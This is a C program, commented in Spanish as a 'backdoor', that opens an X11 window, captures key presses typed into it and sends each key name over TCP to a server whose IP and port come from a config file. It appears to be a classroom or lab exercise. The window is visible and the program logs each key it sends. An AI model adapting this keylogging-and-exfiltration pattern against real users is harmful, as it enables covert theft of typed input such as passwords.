#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h> 
#include <signal.h>
#include <sys/socket.h>

// ==============================================================================
// BLOQUE 1: INICIALIZACIÓN DE RED (CONFIGURACIÓN DEL BACKDOOR)
// ==============================================================================

int main(int argc, char *argv[]) {
    // A. Identidad del proceso: Recibimos el número que nos manda el Launcher
    char *id_proceso = "X";
    if (argc > 1) id_proceso = argv[1]; 

    // B. Lectura Dinámica: Obtenemos IP y Puerto desde config.txt
    FILE *archivo = fopen("config.txt", "r");
    if (archivo == NULL) {
        printf("[-] proceso%s: Error. No se encontró config.txt\n", id_proceso);
        return -1;
    }
    char puerto_str[20], ip_str[50];
    fgets(puerto_str, sizeof(puerto_str), archivo);
    fgets(ip_str, sizeof(ip_str), archivo);
    fclose(archivo);
    
    puerto_str[strcspn(puerto_str, "\n")] = 0;
    ip_str[strcspn(ip_str, "\n")] = 0;
    int puerto_config = atoi(puerto_str);

    // C. Conexión Socket TCP: Establecemos la autopista hacia el IALearner
    int sock = 0;
    struct sockaddr_in serv_addr;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(puerto_config);
    inet_pton(AF_INET, ip_str, &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] proceso%s: Conexión fallida. ¿IALearner está encendido?\n", id_proceso);
        return -1;
    }

    // [DEFENSA]: Ignorar señal SIGPIPE (evita que el SO mate al proceso si la red cae)
    signal(SIGPIPE, SIG_IGN); 

    // ==============================================================================
    // BLOQUE 2: INTERFAZ GRÁFICA X11 (EL ESQUELETO DE IBM)
    // ==============================================================================

    Display *display = XOpenDisplay(NULL);
    if (!display) return 1;

    int screen = DefaultScreen(display);
    Window window = XCreateSimpleWindow(display, RootWindow(display, screen), 
                                        10, 10, 400, 200, 1, 
                                        BlackPixel(display, screen), WhitePixel(display, screen));

    // [DEFENSA]: Registrar protocolo de cierre para capturar el clic en la 'X' roja
    Atom wmDeleteMessage = XInternAtom(display, "WM_DELETE_WINDOW", False);
    XSetWMProtocols(display, window, &wmDeleteMessage, 1);

    XSelectInput(display, window, ExposureMask | KeyPressMask);
    XMapWindow(display, window);
    XEvent event;

    // ==============================================================================
    // BLOQUE 3: BUCLE DE EVENTOS Y BACKDOOR (CAPTURA Y ENVÍO)
    // ==============================================================================

    while (1) {
        XNextEvent(display, &event);

        // A. Manejo de cierre forzado (Clic en la 'X')
        if (event.type == ClientMessage && event.xclient.data.l[0] == wmDeleteMessage) {
            printf("[!] proceso%s: Ventana cerrada desde la 'X'.\n", id_proceso);
            break; 
        }

        // B. Captura de teclas y envío vía Socket
        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            char *name = XKeysymToString(keysym);
            
            if (name) {
                // [DEFENSA]: RADAR TCP (Chequeo preventivo de conexión)
                char radar_buffer[1];
                if (recv(sock, radar_buffer, 1, MSG_DONTWAIT | MSG_PEEK) == 0) {
                    printf("[-] proceso%s: [Radar] Servidor desconectado.\n", id_proceso);
                    break;
                }

                // Envío empaquetado: "P{id}: {tecla}"
                char mensaje[50];
                sprintf(mensaje, "P%s: %s", id_proceso, name);
                
                if (send(sock, mensaje, strlen(mensaje), 0) < 0) {
                    printf("[-] proceso%s: Error en send. Cerrando...\n", id_proceso);
                    break;
                }
                printf("proceso%s -> Letra '%s' enviada al Data Center.\n", id_proceso, name);
            }

            // Condición de salida (Escape)
            if (keysym == XK_Escape) break;
        }
    }

    // ==============================================================================
    // BLOQUE 4: LIMPIEZA TOTAL (LIBERACIÓN DE RECURSOS)
    // ==============================================================================

    close(sock);
    XDestroyWindow(display, window);
    XCloseDisplay(display);
    return 0;
}